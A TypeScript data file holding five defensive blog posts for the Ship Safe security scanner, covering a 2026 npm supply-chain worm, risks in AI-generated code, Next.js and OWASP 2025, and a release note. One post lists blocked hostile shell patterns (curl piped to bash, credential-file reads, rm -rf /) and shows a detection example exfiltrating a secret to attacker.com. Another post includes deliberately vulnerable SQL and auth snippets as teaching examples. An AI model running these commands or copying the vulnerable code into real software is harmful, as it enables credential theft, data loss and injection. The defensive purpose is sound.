export interface BlogPost {
  slug: string;
  title: string;
  description: string;
  date: string;
  author: string;
  tags: string[];
  keywords: string[];
  content: string;
}

export const posts: BlogPost[] = [
  {
    slug: 'supply-chain-attacks-2026-how-we-hardened-ship-safe',
    title: 'From Trivy to CanisterWorm: How We Hardened Ship Safe Against the 2026 Supply Chain Attacks',
    description: 'The Trivy compromise cascaded into CanisterWorm, the first self-spreading npm worm. Here is what happened, why it matters, and exactly how we hardened Ship Safe against the same attack chain.',
    date: '2026-03-25',
    author: 'Ship Safe Team',
    tags: ['supply chain', 'security research', 'CI/CD'],
    keywords: ['supply chain attack 2026', 'CanisterWorm npm', 'Trivy compromise', 'npm trusted publishing', 'GitHub Actions security', 'npm postinstall attack', 'CI/CD security hardening', 'npm OIDC publishing', 'software supply chain security'],
    content: `
In March 2026, a threat group called TeamPCP pulled off one of the most sophisticated supply chain attacks the npm ecosystem has ever seen. It started with a compromised CI token in the Trivy vulnerability scanner and ended with a self-spreading worm infecting over 140 npm packages.

We took this as a wake-up call and spent a week hardening Ship Safe against the exact same attack chain. Here is what happened and what we did about it.

## The Attack Chain

### Stage 1: Trivy GitHub Actions Compromise

Attackers exploited a misconfigured \`pull_request_target\` workflow in the Trivy GitHub Actions repository. Unlike \`pull_request\`, this trigger runs in the context of the base repository, giving attackers access to repository secrets.

They extracted a CI token, then force-pushed malicious code to 75 of 76 version tags in \`aquasecurity/trivy-action\`. Any pipeline referencing those tags (e.g. \`@v1\`, \`@v2\`) executed attacker-controlled code.

### Stage 2: Credential Harvesting

The malicious payload scanned CI runner memory and filesystems for credentials: AWS keys, SSH keys, Kubernetes configs, and npm tokens. CI environments are goldmines because they typically hold publishing credentials.

### Stage 3: CanisterWorm

Less than 24 hours later, stolen npm tokens were used to publish malicious versions of dozens of packages. The payload, dubbed CanisterWorm, had a key innovation: it was self-propagating.

When a developer ran \`npm install\` on an infected package, the \`postinstall\` script would:

1. Steal the developer's npm token from \`~/.npmrc\`
2. Query npm for all packages that token could publish
3. Publish malicious patches to every one of those packages
4. Each infected package then spread the worm to its downstream consumers

The attack expanded to 141 malicious package versions across 66+ packages before discovery.

### Stage 4: LiteLLM (PyPI)

A captured PyPI credential from a project that used the compromised scanner was used to upload malicious versions of LiteLLM (versions 1.82.7 and 1.82.8). A \`.pth\` file executed automatically whenever Python started.

## How We Hardened Ship Safe

We mapped every stage of the attack to a specific defense:

### 1. SHA-Pinned GitHub Actions (blocks Stage 1)

Tag-based references like \`@v4\` can be repointed to malicious commits. We pinned every action in our CI workflow, our published GitHub Action, and the OpenClaw check action to full commit SHAs:

\`\`\`yaml
# Before (vulnerable to tag repointing)
uses: actions/setup-node@v4

# After (immutable reference)
uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
\`\`\`

### 2. Scoped CI Token Permissions (blocks Stage 2)

We added an explicit permissions block to limit what the CI token can access:

\`\`\`yaml
permissions:
  contents: read
\`\`\`

No write access. No packages scope. If our CI token is ever leaked, the blast radius is limited to read-only access to public code.

### 3. Disabled postinstall Scripts (blocks Stage 3)

CanisterWorm's entire propagation mechanism depends on npm's \`postinstall\` lifecycle hook. We disabled it everywhere:

\`\`\`bash
# CI pipeline
npm ci --ignore-scripts

# .npmrc (local dev default)
ignore-scripts=true
\`\`\`

### 4. OIDC Trusted Publishing (blocks Stage 3 + 4)

Long-lived npm tokens are the root cause. If a token is compromised, an attacker can publish as you forever. We set up npm Trusted Publishing with OIDC:

- No npm token stored anywhere (not in CI, not in secrets)
- Each publish uses a short-lived, cryptographically-signed token
- The token is scoped to a specific workflow file, repository, and environment
- Provenance attestation is automatic, linking every published version to its source commit

### 5. CODEOWNERS for Critical Paths

We added a CODEOWNERS file requiring explicit review for supply-chain-critical files:

\`\`\`
action.yml              @asamassekou10
.github/                @asamassekou10
package.json            @asamassekou10
package-lock.json       @asamassekou10
cli/bin/                @asamassekou10
\`\`\`

### 6. Package Contents Allowlist

Our \`package.json\` uses a strict \`files\` allowlist so only the CLI code ships. No test files, no configs, no marketing content:

\`\`\`json
"files": ["cli/", "!cli/__tests__/", "checklists/", "configs/", "snippets/", "ai-defense/"]
\`\`\`

The publish workflow also runs a sensitive-file gate that blocks releases containing \`.env\`, \`.pem\`, or credential files.

### 7. Self-Scanning in CI

Ship Safe scans itself in every CI run. If a supply chain attack injects malicious code, our own scanner catches it before it ships.

## What Ship Safe Detects for You

Ship Safe's CICDScanner and SupplyChainAudit agents detect the same vulnerabilities that enabled this attack:

| Finding | Agent | OWASP |
|---------|-------|-------|
| Unpinned GitHub Actions (\`@v1\` instead of \`@sha\`) | CICDScanner | CICD-SEC-9 |
| \`pull_request_target\` with checkout | CICDScanner | CICD-SEC-4 |
| Wildcard dependency versions | SupplyChainAudit | A06:2025 |
| Missing lockfile | SupplyChainAudit | A06:2025 |
| Suspicious postinstall scripts | SupplyChainAudit | A06:2025 |
| Typosquatted packages (Levenshtein distance) | SupplyChainAudit | A06:2025 |
| Leaked npm/PyPI tokens in code | Scanner | A02:2025 |
| Tokens in git history | GitHistoryScanner | A02:2025 |

Scan your project now:

\`\`\`bash
npx ship-safe audit .
\`\`\`

## Key Takeaways

1. **Pin all GitHub Actions to commit SHAs.** Tags are mutable. SHAs are not.
2. **Disable postinstall scripts by default.** Opt in per-package, not out.
3. **Use OIDC for publishing.** Long-lived tokens are a single point of failure.
4. **Your CI pipeline is a high-value target.** Treat it like production infrastructure.
5. **Scan your own supply chain.** \`npx ship-safe audit .\` catches unpinned actions, wildcard deps, and suspicious scripts in one command.

## Sources

- [Prismor: From Trivy to LiteLLM supply chain attack analysis](https://x.com/prismor_dev/status/2036656716147003861) - the thread that prompted our hardening sprint
- [The Hacker News: Trivy Supply Chain Attack Triggers Self-Spreading CanisterWorm](https://thehackernews.com/2026/03/trivy-supply-chain-attack-triggers-self.html)
- [The Hacker News: TeamPCP Backdoors LiteLLM Versions 1.82.7-1.82.8](https://thehackernews.com/2026/03/teampcp-backdoors-litellm-versions.html)
- [Microsoft Security Blog: Detecting and defending against the Trivy supply chain compromise](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/)
- [CrowdStrike: From Scanner to Stealer](https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/)
- [Arctic Wolf: TeamPCP Supply Chain Attack Campaign](https://arcticwolf.com/resources/blog/teampcp-supply-chain-attack-campaign-targets-trivy-checkmarx-kics-and-litellm-potential-downstream-impact-to-additional-projects/)
- [Kaspersky: Trojanization of Trivy, Checkmarx, and LiteLLM](https://www.kaspersky.com/blog/critical-supply-chain-attack-trivy-litellm-checkmarx-teampcp/55510/)
- [npm Trusted Publishing Docs](https://docs.npmjs.com/trusted-publishers/)
- [Aqua Security: Trivy Supply Chain Attack Advisory (GHSA-69fq-xp46-6x23)](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23)

Ship fast. Ship safe.
    `.trim(),
  },
  {
    slug: 'vibe-coding-security-risks',
    title: 'Vibe Coding Is Fast, But Is It Safe? 7 Security Risks in AI-Generated Code',
    description: 'AI coding tools ship code fast but skip security checks. Here are the 7 most common vulnerabilities in AI-generated code and how to catch them automatically.',
    date: '2026-03-25',
    author: 'Ship Safe Team',
    tags: ['AI security', 'vibe coding', 'best practices'],
    keywords: ['vibe coding security', 'AI generated code vulnerabilities', 'Cursor security', 'Copilot security risks', 'Claude Code security', 'AI coding assistant security'],
    content: `
Vibe coding, the practice of building apps by describing what you want to an AI and letting it write the code, is the fastest way to ship software in 2025. Cursor, Claude Code, Copilot, and Windsurf have made it possible to go from idea to deployed app in hours.

But there's a problem: **AI coding tools optimize for functionality, not security.**

We've scanned hundreds of vibe-coded projects with Ship Safe, and the same security patterns keep appearing. Here's what we found.

## 1. Hardcoded Secrets

The most common finding by far. AI assistants frequently complete configuration with real-looking API keys, database URLs, and auth tokens.

\`\`\`javascript
// AI-generated config
const stripe = require('stripe')('sk_live_51ABC...');
const db = new Pool({ connectionString: 'postgresql://admin:pass@...' }); // ship-safe-ignore — example code
\`\`\`

**Fix:** Always use environment variables. Run \`npx ship-safe scan .\` to catch any that slip through.

## 2. API Routes Without Authentication

AI generates the endpoint logic beautifully but forgets the auth middleware.

\`\`\`typescript
// AI-generated: "create an API endpoint to delete a user"
export async function DELETE(req: Request) {
  const { userId } = await req.json();
  await db.user.delete({ where: { id: userId } });
  return Response.json({ success: true });
}
// Anyone can delete any user
\`\`\`

**Fix:** Always wrap state-changing routes with auth middleware. Ship Safe's AuthBypassAgent flags these automatically.

## 3. Raw SQL Queries

AI sometimes reaches for raw queries instead of parameterized ones, especially for complex filtering.

\`\`\`python
# AI-generated: "search users by name"
@app.route('/search')
def search():
    name = request.args.get('name')
    results = db.execute(f"SELECT * FROM users WHERE name LIKE '%{name}%'")
    return jsonify(results)
\`\`\`

**Fix:** Always use parameterized queries. Ship Safe's InjectionTester catches SQL injection, NoSQL injection, and command injection patterns.

## 4. Missing Input Validation

Server Actions, API routes, and form handlers that trust user input blindly. A common pattern: AI generates a form handler that passes \`role\` from the form directly to the database, letting users promote themselves to admin.

**Fix:** Use Zod schemas to validate all user input. Whitelist allowed fields explicitly.

## 5. Excessive LLM Agency

If you're building AI features, AI assistants often give the LLM too much power: direct database writes, shell commands, file system access, all without human approval.

**Fix:** Restrict destructive tools behind a human-in-the-loop approval step. Ship Safe's AgenticSecurityAgent checks for OWASP LLM04 (Excessive Agency).

## 6. Docker Running as Root

AI generates a working Dockerfile, but usually without a non-root user. This is a container escape risk.

**Fix:** Add a \`USER\` directive to your Dockerfile. Ship Safe's ConfigAuditor flags this.

## 7. Wildcard Dependencies

AI often adds dependencies without pinning versions, or uses \`*\` for quick setup. This is a supply chain attack vector.

**Fix:** Pin exact versions. Use \`npx ship-safe audit .\` to catch wildcard versions and known CVEs in your dependency tree.

## The Fix: One Command After Every Vibe Coding Session

\`\`\`bash
npx ship-safe audit .
\`\`\`

18 agents, 80+ attack classes, 3 seconds. Free and open source.

Add it to your pre-commit hook to make it automatic:

\`\`\`bash
npx husky init
echo "npx ship-safe diff --staged" > .husky/pre-commit
\`\`\`

Ship fast. Ship safe.
    `.trim(),
  },
  {
    slug: 'securing-nextjs-app',
    title: 'How to Secure Your Next.js App: A Complete Guide with Ship Safe',
    description: 'Next.js has unique security patterns that generic scanners miss. Learn how to find and fix NEXT_PUBLIC_ leaks, unprotected server actions, and API route vulnerabilities.',
    date: '2026-03-24',
    author: 'Ship Safe Team',
    tags: ['Next.js', 'security', 'tutorial'],
    keywords: ['Next.js security', 'secure Next.js app', 'NEXT_PUBLIC_ security', 'Next.js API route authentication', 'Next.js server actions validation', 'Next.js security headers', 'Supabase RLS Next.js'],
    content: `
Next.js is one of the most popular frameworks for building full-stack web applications. But with great power comes great attack surface: API routes, server components, middleware, environment variables, and client-side rendering all introduce security considerations.

This guide shows you how to use Ship Safe to audit your Next.js app for vulnerabilities and fix them before they ship.

## Quick Start

\`\`\`bash
cd your-nextjs-app
npx ship-safe audit .
\`\`\`

Ship Safe automatically detects Next.js and adjusts its scanning accordingly.

## 1. Leaked Environment Variables

The most common Next.js security mistake: accidentally exposing secrets through \`NEXT_PUBLIC_\` prefixed variables.

\`\`\`
[SECRETS] API key exposed via NEXT_PUBLIC_ prefix
  .env.local:5 → NEXT_PUBLIC_STRIPE_SECRET_KEY should not use NEXT_PUBLIC_ prefix
  Severity: CRITICAL
\`\`\`

**The rule:** Only use \`NEXT_PUBLIC_\` for values that are safe to expose in the browser. Never for API keys, database URLs, or auth secrets.

## 2. Unprotected API Routes

Next.js API routes (both \`pages/api/\` and \`app/api/\`) without authentication or rate limiting.

\`\`\`
[AUTH] API route without authentication check
  app/api/users/route.ts:1 → Add auth middleware
  OWASP: A07:2025 Authentication Failures
\`\`\`

**Fix:** Add auth checks and rate limiting to every state-changing route.

## 3. Server Actions Without Validation

Next.js Server Actions that accept user input without validation are vulnerable to injection and mass assignment attacks.

\`\`\`
[INJECTION] Server Action processes unvalidated user input
  app/actions.ts:15 → Validate input with Zod schema
  OWASP: A03:2025 Injection
\`\`\`

**Fix:** Use Zod schemas to validate all Server Action inputs. Whitelist allowed fields.

## 4. XSS via dangerouslySetInnerHTML

React's escape hatch for rendering raw HTML is a common XSS vector.

**Fix:** Always sanitize with DOMPurify before rendering user-provided HTML.

## 5. Missing Security Headers

Next.js doesn't set security headers by default. Ship Safe checks your \`next.config.js\` and middleware for Content-Security-Policy, X-Frame-Options, and others.

**Fix:** Configure headers in \`next.config.js\` using the \`headers()\` function.

## 6. Supabase RLS Issues

If you use Supabase with Next.js, Ship Safe's dedicated SupabaseRLSAgent checks for Row Level Security misconfigurations and \`service_role\` key exposure in client-side code.

## CI/CD Integration

\`\`\`yaml
name: Security Audit
on: [push, pull_request]

jobs:
  ship-safe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: asamassekou10/ship-safe@v6
        with:
          path: .
          threshold: 70
          github-pr: true
\`\`\`

## Next.js Security Checklist

After running \`npx ship-safe audit .\`, verify:

- No secrets in \`NEXT_PUBLIC_\` variables
- All API routes have authentication
- Rate limiting on auth endpoints
- Server Actions validate input with Zod
- \`dangerouslySetInnerHTML\` uses DOMPurify
- Security headers configured in \`next.config.js\`
- Supabase RLS enabled (if applicable)
- Docker runs as non-root user
- Dependencies are up to date
- CI/CD pipeline includes security scanning

Ship fast. Ship safe.
    `.trim(),
  },
  {
    slug: 'owasp-2025-what-changed',
    title: 'OWASP Top 10 2025: What Changed and How to Scan for It',
    description: 'The OWASP Top 10 2025 reshuffles the rankings and adds new categories. Here is what changed and how Ship Safe covers every category with its 18 AI security agents.',
    date: '2026-03-23',
    author: 'Ship Safe Team',
    tags: ['OWASP', 'security', 'compliance'],
    keywords: ['OWASP Top 10 2025', 'OWASP 2025 changes', 'OWASP scanner', 'OWASP compliance tool', 'application security testing', 'OWASP vulnerability scanner', 'A01 2025 broken access control'],
    content: `
The OWASP Top 10 2025 is the latest update to the most widely referenced standard for web application security. If you're building or maintaining web applications, this is the benchmark your security posture is measured against.

Here's what changed from 2021 to 2025, and how Ship Safe's 18 agents map to every category.

## The 2025 Top 10

| Rank | Category | What's New |
|------|----------|-----------|
| A01 | Broken Access Control | Still #1. Now includes BOLA and mass assignment |
| A02 | Cryptographic Failures | Expanded to cover weak JWT secrets and missing TLS |
| A03 | Injection | Now includes template injection and prompt injection |
| A04 | Insecure Design | Architecture-level flaws, not just implementation bugs |
| A05 | Security Misconfiguration | Docker, K8s, CORS, CSP, and cloud misconfigs |
| A06 | Vulnerable Components | Supply chain attacks now explicitly included |
| A07 | Authentication Failures | Rate limiting, MFA bypass, session fixation |
| A08 | Data Integrity Failures | Insecure deserialization, unsigned updates |
| A09 | Logging & Monitoring | Expanded to include missing audit trails |
| A10 | Server-Side Request Forgery | SSRF promoted from sub-category to its own entry |

## What Changed from 2021

**Injection (A03) now includes prompt injection.** This is the biggest shift. With LLMs embedded in production applications, prompt injection is now an OWASP-recognized web vulnerability, not just an AI concern.

**Supply chain attacks are now explicit in A06.** Typosquatting, dependency confusion, and malicious packages are no longer edge cases. They're mainstream attack vectors.

**SSRF got its own category (A10).** Previously a sub-item, SSRF is now important enough to stand alone, driven by cloud metadata attacks and internal service exploitation.

## How Ship Safe Covers OWASP 2025

Ship Safe's 18 agents map to every OWASP 2025 category:

| OWASP 2025 | Ship Safe Agents |
|------------|-----------------|
| A01: Broken Access Control | AuthBypassAgent, APIFuzzer |
| A02: Cryptographic Failures | AuthBypassAgent (JWT), Scanner (secrets) |
| A03: Injection | InjectionTester, LLMRedTeam (prompt injection) |
| A04: Insecure Design | VibeCodingAgent, AgenticSecurityAgent |
| A05: Security Misconfiguration | ConfigAuditor, CICDScanner |
| A06: Vulnerable Components | SupplyChainAudit, dependency audit |
| A07: Authentication Failures | AuthBypassAgent, APIFuzzer |
| A08: Data Integrity Failures | SupplyChainAudit, InjectionTester |
| A09: Logging & Monitoring | ExceptionHandlerAgent |
| A10: SSRF | SSRFProber |

Beyond the standard Top 10, Ship Safe also covers:

- **OWASP LLM Top 10 2025** via LLMRedTeam, MCPSecurityAgent, RAGSecurityAgent
- **OWASP Agentic AI Top 10** via AgenticSecurityAgent
- **OWASP Mobile Top 10 2024** via MobileScanner
- **OWASP CI/CD Top 10** via CICDScanner

## Scan Your Project Against OWASP 2025

\`\`\`bash
npx ship-safe audit .
\`\`\`

Every finding includes its OWASP category, CWE identifier, and a prioritized fix. The scoring engine weights findings by OWASP 2025 severity to produce a 0-100 score.

For compliance reporting, Ship Safe maps findings to SOC 2 Type II, ISO 27001:2022, and NIST AI RMF controls.

Ship fast. Ship safe.
    `.trim(),
  },
  {
    slug: 'ship-safe-v6-2-claude-code-hooks-universal-llm',
    title: 'Ship Safe v6.2: Real-Time Claude Code Hooks and Universal LLM Support',
    description: 'Ship Safe v6.2 ships real-time Claude Code hooks that block secrets before they land on disk, support for 8 LLM providers including Groq and DeepSeek, and IOC matching for known-compromised npm packages.',
    date: '2026-04-01',
    author: 'Ship Safe Team',
    tags: ['release', 'Claude Code', 'AI security'],
    keywords: ['Claude Code hooks security', 'real-time secret detection', 'ship-safe v6.2', 'universal LLM support', 'Groq security scanner', 'AI coding security', 'npm compromised packages', 'CanisterWorm detection'],
    content: `
Ship Safe v6.2 is out. This release is focused on one idea: catching security issues as close to the source as possible, before they ever touch a file on disk.

## Claude Code Hooks — Real-Time Secret Blocking

The headline feature is native integration with Claude Code's hooks system. One command installs ship-safe as both a \`PreToolUse\` and \`PostToolUse\` hook:

\`\`\`bash
npx ship-safe hooks install
\`\`\`

After that, every file write Claude Code makes is screened automatically.

### How it works

Claude Code fires hooks at two points in its tool execution lifecycle:

**PreToolUse** runs before the tool executes. For \`Write\`, \`Edit\`, \`MultiEdit\`, and \`Bash\` calls, ship-safe scans the content being written. If a critical secret is detected — an AWS Access Key, GitHub PAT, Stripe live key, OpenAI key, PEM private key, and 13 others — the write is blocked before anything reaches the filesystem. Claude sees the block message and is prompted to use an environment variable instead.

**PostToolUse** runs after a successful write. Ship-safe scans the saved file for high-severity patterns — database URLs with embedded credentials, high-entropy generic tokens, hardcoded passwords — and injects findings directly into Claude's context as advisory messages. Nothing is blocked at this stage; the goal is awareness for the next action.

### Dangerous Bash patterns

The \`PreToolUse\` hook also intercepts \`Bash\` tool calls and blocks:

- \`curl ... | bash\` / \`wget ... | sh\` — remote script execution without verification
- \`iex (Invoke-WebRequest ...)\` — PowerShell equivalent
- \`cat ~/.aws/credentials\` — credential file reads
- \`curl https://... $GITHUB_TOKEN\` — environment variable exfiltration over the network
- \`npm install --unsafe-perm\` — elevated install script privileges
- \`git commit -m "... ghp_...\` — secrets embedded in commit messages
- \`rm -rf /\` or targeting system paths — recursive force deletes

These are the exact patterns that appear in supply chain attack payloads like CanisterWorm's \`postinstall\` scripts.

### Why stable paths matter

A subtle but important implementation detail: when you run \`npx ship-safe hooks install\`, the hook scripts are copied to \`~/.ship-safe/hooks/\` — a stable, user-owned directory — before being registered in \`~/.claude/settings.json\`. This is critical.

npx stores packages in a volatile cache directory that can be rotated or cleared at any time. If we registered the npx cache path directly, hooks would silently stop working after a cache rotation. By copying the scripts to a predictable location first, hooks remain functional regardless of what npx does later. Running \`npx ship-safe hooks install\` after an update refreshes the scripts.

### Precision over recall

All 18 critical patterns require specific, vendor-issued prefixes:

| Pattern | Prefix |
|---------|--------|
| AWS Access Key ID | \`AKIA\` |
| GitHub PAT (classic) | \`ghp_\` |
| GitHub Fine-Grained PAT | \`github_pat_\` |
| npm Auth Token | \`npm_\` |
| Stripe Live Key | \`sk_live_\` |
| Slack Bot Token | \`xoxb-\` |
| Anthropic API Key | \`sk-ant-api03-\` |
| Supabase Service Role | JWT with \`service_role\` in payload |
| PEM Private Key | \`-----BEGIN ... PRIVATE KEY-----\` |

Generic high-entropy patterns (passwords, tokens) are advisory-only and gated by a Shannon entropy threshold of 3.5 — enough to suppress placeholder values like \`"your-secret-here"\` while catching real 256-bit random strings.

\`.env\` files are allowed but checked for \`.gitignore\` coverage. \`.env.example\` files are silently skipped entirely.

---

## Universal LLM Support

Deep analysis and AI classification now work with any OpenAI-compatible provider via the \`--provider\` and \`--base-url\` flags:

\`\`\`bash
# Use Groq for fast, cheap deep analysis
npx ship-safe audit . --deep --provider groq

# Use a local LM Studio instance
npx ship-safe audit . --deep --provider lmstudio

# Any OpenAI-compatible endpoint
npx ship-safe audit . --deep --base-url http://localhost:8000/v1 --model my-model
\`\`\`

Supported providers with auto-detection from environment variables:

| Provider | Env Variable | Default Model |
|----------|-------------|---------------|
| Groq | \`GROQ_API_KEY\` | llama-3.3-70b-versatile |
| Together AI | \`TOGETHER_API_KEY\` | Llama-3-70b-chat-hf |
| Mistral | \`MISTRAL_API_KEY\` | mistral-small-latest |
| DeepSeek | \`DEEPSEEK_API_KEY\` | deepseek-chat |
| xAI (Grok) | \`XAI_API_KEY\` | grok-beta |
| Perplexity | \`PERPLEXITY_API_KEY\` | llama-3.1-sonar-small-128k-online |
| LM Studio | *(none)* | Local server |

Anthropic, OpenAI, Google, and Ollama continue to work as before and are auto-detected from their existing environment variables. If multiple keys are set, the priority order is Anthropic → OpenAI → Google → Groq → Together → Mistral → DeepSeek → xAI.

---

## Supply Chain IOC Matching

The \`SupplyChainAgent\` now checks your dependency tree against a list of known-compromised package versions. Currently tracked:

| Package | Bad Versions | Threat |
|---------|-------------|--------|
| \`litellm\` | 1.82.7, 1.82.8 | TeamPCP backdoor, auto-executing \`.pth\` file |
| \`axios\` | 1.8.2 | Malicious patch published via stolen npm token |
| \`telnyx\` | 2.1.5 | Credential harvesting postinstall |

The agent also flags ICP blockchain packages (\`@dfinity/agent\`, \`ic-agent\`) in the dependency tree as a CanisterWorm C2 indicator. The real CanisterWorm used the Internet Computer Protocol blockchain to host its command-and-control channel, making it resilient to domain takedowns.

---

## CI/CD Detection Improvements

Two new patterns in the \`CICDScanner\`:

**Environment variable exfiltration** — catches secrets being sent over the network from GitHub Actions steps:

\`\`\`yaml
- run: curl https://attacker.com/?token=\${{ secrets.API_KEY }}
\`\`\`

**OIDC broad subject claims** — catches wildcard OIDC trust relationships that allow any branch or PR to assume a cloud role:

\`\`\`yaml
# Dangerous: any branch can assume this role
subject: "repo:org/repo:*"
\`\`\`

The unpinned action detector was also tightened: \`@v1\`, \`@v1.2.3\`, and semver tags are now all flagged as unpinned. Only a full 40-character commit SHA is accepted as pinned.

---

## What's next

- GitHub App integration — connect repos directly, scheduled scans, PR comments without CI changes
- EPSS live feed — real-time exploit probability scores from FIRST.org
- Hooks for Cursor and Windsurf — same real-time protection for other AI editors

Install the hooks now:

\`\`\`bash
npx ship-safe hooks install
npx ship-safe hooks status
\`\`\`

Ship fast. Ship safe.
    `.trim(),
  },
];

export function getPostBySlug(slug: string): BlogPost | undefined {
  return posts.find((p) => p.slug === slug);
}

export function getAllSlugs(): string[] {
  return posts.map((p) => p.slug);
}
